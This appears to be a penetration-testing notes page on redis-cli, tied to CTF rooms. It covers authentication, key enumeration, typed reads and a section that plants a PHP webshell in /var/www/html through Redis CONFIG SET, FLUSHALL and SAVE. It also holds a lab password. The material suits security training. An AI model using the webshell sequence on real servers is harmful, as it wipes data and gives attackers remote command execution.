# redis-cli

Command-line client for Redis. Used to authenticate against `requirepass`-protected instances, enumerate keys, read every data type, and abuse writable Redis snapshots when the service can write into a web root.

## Commands Used

### Authenticate and open interactive session
<!-- cmd: linux -->
```bash
redis-cli -h $TARGET -a 'B65Hx562F@ggAZ@F'
```
Used on: **VulnNet: Internal**

### Unauthenticated interactive session
<!-- cmd: linux -->
```bash
redis-cli -h $TARGET -p 6379
INFO
CONFIG GET dir
```
Used on: **res**

Flags:
- `-h` — remote host
- `-a` — password (triggers `AUTH` on connect; prints a warning about `ps` exposure)
- `-n <db>` — select DB (0 by default)
- `--no-auth-warning` — silence the `-a` warning in scripts

### Basic orientation (inside client)
```
INFO
INFO server
INFO keyspace
CONFIG GET dir
CONFIG GET dbfilename
```
Used on: **VulnNet: Internal**

### Key enumeration
```
KEYS *
```
Used on: **VulnNet: Internal**

enumerated every key in the default DB.

Safer alternative on production (paginated):
```
SCAN 0 COUNT 1000
```

### Read a string key
```
GET "internal flag"
```
Used on: **VulnNet: Internal**

returned the `internal` flag.

### Read a list key
```
LRANGE "authlist" 0 -1
```
Used on: **VulnNet: Internal**

returned a base64 blob  rsync credentials.

### Write a PHP webshell through Redis snapshotting
<!-- cmd: redis -->
```text
CONFIG SET dir /var/www/html
FLUSHALL
SET shell "<?php system($_GET['cmd']); ?>"
SAVE
```
Used on: **res**

See [redis-webroot-webshell.md](../../exploits/network-services/redis-webroot-webshell.md).

## Typed reads cheat sheet

```
TYPE <key>
```

| Type     | Read command                         |
|----------|--------------------------------------|
| string   | `GET <key>`                          |
| list     | `LRANGE <key> 0 -1`                  |
| hash     | `HGETALL <key>`                      |
| set      | `SMEMBERS <key>`                     |
| zset     | `ZRANGE <key> 0 -1 WITHSCORES`       |
| stream   | `XRANGE <key> - +`                   |

## Non-interactive one-shots
<!-- cmd: linux -->
```bash
redis-cli -h $TARGET -a '<pass>' --no-auth-warning PING
redis-cli -h $TARGET -a '<pass>' --no-auth-warning GET "internal flag"
redis-cli -h $TARGET -a '<pass>' --no-auth-warning --scan > keys.txt
```

## Related
- [Redis authenticated enumeration playbook](../../exploits/network-services/redis-auth-abuse.md)


